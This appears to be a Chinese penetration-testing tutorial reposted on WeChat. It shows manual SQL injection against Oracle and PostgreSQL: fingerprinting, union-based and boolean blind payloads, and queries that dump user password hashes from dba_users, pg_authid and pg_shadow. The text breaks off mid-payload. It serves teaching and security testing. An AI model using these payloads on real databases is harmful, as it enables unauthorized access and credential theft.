---
title: 数据库—从注入到提权的全家桶套餐
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495317&idx=1&sn=50ed65b8c8a3ce9b771e260204bbd0f3&chksm=e8a5e4f6dfd26de02e682868b39e54767755ae8fa0b513631d51ae9a8e89c5bc00602ec24ca8&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-07-21
fetch_date: 2025-10-06T17:41:32.680906
---

# 数据库—从注入到提权的全家桶套餐

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj5FwRA47adDeZjltEAFEuial4Hst93q8lZYIQ7G1YS0wauiaVKVxP0NqibC0ANQOWV9ke51V8XhQN25Q/0?wx_fmt=jpeg)

# 数据库—从注入到提权的全家桶套餐

迪哥讲事

以下文章来源于酒仙桥六号部队
，作者队员编号055

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6h5jOvetH9FCV9SZjkg2PBbViaA8jlNfDJtZqedia3h3UQ/0)

**酒仙桥六号部队**
.

知其黑，守其白。 分享知识盛宴，闲聊大院趣事，备好酒肉等你！

这是 **酒仙桥六号部队**的第 **55**篇文章。

全文共计5397个字，预计阅读时长17分钟。

#

**前言**

#

偶然看到了最新的数据库流行度排名，发现在前5名的关系型数据库中，日常渗透测试见到最多的便是MySQL，排名第一的Oracle可能因为企业版高昂的价格限制了用户群众，在实际中相对于MySQL遇到的偏少，作为完全免费开源的PostgreSQL，虽然也占据了榜单Top 4，但目前在国内碰到的几率也很小。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0icxMrCSYDKnmhhS2NLCibBLGgwqRMyIjvRDtu3lLATyzQ8o8tYhLpvjA/640?wx_fmt=jpeg)

所以这次先重点研究一下Oracle与PostgreSQL这两种数据库从手注到提权的不同方式，避免过度依赖sqlmap一把梭的尴尬局面。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0RSDslhT2q9LkvVhZCPlUgX3b8o8dddsleyl27CHnFLsen3rxibiaZHjg/640?wx_fmt=jpeg)

**SQL注入分析**

### 1.数据库类型判断

身为关系型数据库，自然避免不了SQL注入的话题，而在进行注入前，我们首先要对数据库的种类进行判断 Oracle：根据特有的表进行判断：

```
and (select count(*) from sys.user_tables)>0
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp088TSqZMIBIJuf3eYTpNibiaj5Ea2I3yd0AjBvSmA1YQs5zmndzPAd4ww/640?wx_fmt=jpeg)

PostgreSQL：根据特有的语法判断：

```
and+1::int=1--
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0vvQ5w961roheNNYrvmq1pwX6V4DWADRYmtWzgEoN0MxlxoKGibXoBeQ/640?wx_fmt=jpeg)

接下来我们从各自的数据库语法去分析不同的SQL注入方式，SQL注入按照我们熟悉的注入语法又划分为:基于布尔的盲注、基于时间延迟的盲注、显错注入、联合查询注入、堆查询注入，我们依次来对两种数据库进行分析。

### 2.联合查询注入

**Oracle**

a.在Oracle中，存在dual虚拟表，任何用户都可以去读取查询，因为Oracle数据库的查询语句必须包含from属性，所以常用在没有目标表的select查询语句中，比如可以查询当前用户等。

```
and 1=2 union select null,user,null from dual（获取当前用户名）
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp04qXpXkTdy3TleulJVgf05ialSQNGoNZdp8oFQZRibYcPq0dH3DjhBF5g/640?wx_fmt=jpeg)

b.Oracle联合查询注入需要依次判断每个字段的字段类型，而不能像mysql中字段直接全部套用数字型。

```
and 1=2 union select 1,null,null from dual
```

若返回正常则为整数型，异常则为字符型'null'。

```
and 1=2 union select 1,'null','null' from dual
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0XwsKxL2VsAlyuXZPiaqcMyv5C9Kqn8BwXSf1JBbegG3w14CggDFTUUQ/640?wx_fmt=jpeg)

c.Oracle数据库不支持mysql中limit功能，但可以通过rownum来限制返回的结果集的行数.查看前5个数据库用户，数据库用户均存在dba\_users表中。

```
and 1=2 union select 1,username,password from dba_users where rownum<=5
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0KWhibgrvVzrjNuKSyt7pNcibfDjh5vO62B91dfhBN4mtOibsiaJ1BOvvVA/640?wx_fmt=jpeg)

d.联合查询注入需要用到查看表结构、字段名等功能，在mysql中大家所熟知的是information\_schema，而在Oracle中同样拥有此类功能视图。

dba*\**dba拥有的或可以访问的所有对象

all\*  某用户拥有的或可以访问的所有的对象

user\_\* 某用户拥有的所有对象(必须是拥有者owner，相当于表的创建者)

比如在user\_tab\_columns中，表名与字段名一一对应展示，可以同时对表名及字段名进行查询：

and 1=2 union select 1,table\_name,column\_name from user\_tab\_columns where rownum<=2000

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0akGdE15kViad6KFfWBVLz6blv8mTXLoPBFe0VFKe37e2YcBEJ0Aet4w/640?wx_fmt=jpeg)

e.其他常用语句：

可通过查看数据库文件位置间接判断操作系统。

```
and 1=2 union select 1,name,'null' from V$DATAFILE
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp01DYmibjSbRkEmR4gIicN0pHqbhmJEDw27yyJ81j4pQaoA4FbHEyDCNPQ/640?wx_fmt=jpeg)

查看数据库版本：

```
and 1=2 union select 1,version,'null' from v$instance
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0pzTJAKz9ucDdWFDW27ZByypx9y4jkB6h5RLU1ialvEWUWpjzLicGkCjA/640?wx_fmt=jpeg)

查看用户权限：

```
and 1=2 union select 1,privilege,'null' from session_privs
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0tFtwDgS49icnzz6iaolk62c2YE7hoctMfMGgnrXiczcC9dLa0dG91H02w/640?wx_fmt=jpeg)

查看主机IP：

```
and 1=2 unions select utl_inaddr.get_host_address from dual
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0hibyxwLS9sRqXvw5KmUHXy5dB56QbzV4FibIus4ArupAlxZCEp2ayyYQ/640?wx_fmt=jpeg)

**PostgreSQL**

a.在order by确认字段数量后后需跟oracle一样，使用null来填充字段，然后依次去判断每个字段的字符类型（字符类型用'null',整数型用直接用整数代替），若直接使用整数型1,2,3来填充则会报错。

```
and 1=2 union select 1,2,3
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0cslqvHVfr0PAPGqlRlVdpXVhZgSSfSDxibPZbSmY4aMpNmOibSsqmcjQ/640?wx_fmt=jpeg)

```
and 1=2 union select null,null,null
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp07iaibXve8z17lJa8GR14QXuAT7C85xZweiaia16KWf67ToQAE7JcNq1HYA/640?wx_fmt=jpeg)

最终判断出的每个字段的类型，以及页面回显位。

```
and 1=2 union select 100,'null','null'
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0AN8dP45nylwrWITe2fvEJbaibMM8YLbicKXFcrq8H5aMXCuCBmUe0mEA/640?wx_fmt=jpeg)

b.查询当前数据库使用current\_database()函数。

```
and 1=2 union select 1,current_database(),'null'
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0bzqTIkVNdBaAV375Q0O1UubVacjaT4bzOAw6D4IYjiaz3vk5nARzMLg/640?wx_fmt=jpeg)

c.PostgreSQL数据库中的pg\_stat\_user\_tables相当于mysql中的information\_schema.tables()，realname代替mysql中的table\_name进行查询。

d.PostgreSQL中的limit与mysql中的使用有所差异，语法为limit 1 offset 0。

```
and 1=2 union select 1,relname,'null' from pg_stat_user_tables limit 1 offset 0
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0NXNkGX8ht79iasvbbqQFs34rbbib218iaqn9W8gTy8K13gGfv655L4sbA/640?wx_fmt=jpeg)

之后便与mysql中的联合查询注入步骤及用法一样往后进行注入取值。

```
and 1=2 union select 1,column_name,'null' from information_schema.columns where table_name = 'tbuser' limit 1 offset 0
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0v71tInMEkQ0TTeMmGiaKXFXTeoUnLGJzxicA21GoxvwERRG3lLHFs5TA/640?wx_fmt=jpeg)

```
and 1=2 union select 1,username,password from tbuser where id = 2
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0X2xXRoTfvGUhjSuUxvOlTsQbXLY1NOOP6hevfRbn7y6U4aLI8xiaveg/640?wx_fmt=jpeg)

e.利用sql注入查找超级用户postgres密码PostgreSQL数据库中用户账号密码存在于pg\_authid以及pg\_shadow表中。

```
and 1=2 union select 1,rolname,rolpassword from pg_authid limit 1 offset 0
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0PljUMHuobojDy4UHsVcOF1EsK3IIe6Jo8icxTCutFGpZ7yiadnm9Lt4Q/640?wx_fmt=jpeg)

```
and 1=2 union select 1,usename,passwd from pg_shadow limit 1 offset 0
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0Bq1tuk2FAN2TAibtPOrXURtqj9FeGNAS1OweBJO7TanK0vhmDepHntg/640?wx_fmt=jpeg)

此处有个需要注意的地方就是md5解出来的字符并不是全部都为密码，而是为“密码+账号”，如图所示，123456为用户postgres的密码。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0CSXw5FOJ5LLOdDGEsuZJJORC7MfoB0EUW1hulOuaf4Ys8Tr7OsOR6Q/640?wx_fmt=jpeg)

获取账号密码后，可以远程连接执行sql命令。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp00sruw5VzialcFCFRIM1lfgOLkM89CYIJfua9UpdxVibNmHCa8AU3SB5Q/640?wx_fmt=jpeg)

### 3.布尔盲注

**Oracle**

a.instr()函数:查找一个字符串在指定字符串的出现位置。

```
and 1=(instr((select user from dual),'S'))and 2=(instr((select user from dual),'Y'))and 3=(instr((select user from dual),'S'))
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0dEecYdpy3E8ONXMb4o9ZvoymWxaQlzlcfwFdhOianhAo9ox2RCibSnwA/640?wx_fmt=jpeg)

b.decode()函数与substr()函数结合:decode函数为字符串运算函数，若字符串1等于字符串2，则返回1，不等于则返回0。

and 1=(select decode(user,'SYSTEM',1,0) from dual) --

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp07MY8nLUibplbUnZ9iaR6ibibqBmEU5TbLqeMHjYUSa3ObTzaLIpZ0SBVyg/640?wx_fmt=jpeg)

与substr()函数结合，进行布尔盲注。

```
and 1=(select decode(substr((select username||password from tbuser),1,1),'t',1,0) from dual) --and 1=(select decode(substr((select username||password from tbuser),2,1),'e',1,0) from dual) --and 1=(select decode(substr((select username||password from tbuser),3,1),'s',1,0) from dual) --and 1=(select decode(substr((select username||password from tbuser),4,1),'t',1,0) from dual) --
```

c.常规ascii值猜解。

先使用length()判断字符串长度。

```
and 8=(select length(username||password) from tbuser where rownum=1)
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s56YeYwP1E6iaEM6gMGh0DNp0X8o7MNnb12EMnoNkM0yX0kehXbqUlg35ibTmsgARNUf2D2mEEVEUHdg/640?wx_fmt=jpeg)

再逐个字符去猜解ascii码值。

```
and 116=(select ascii(substr(username||password,1,1)) from tbuser where r...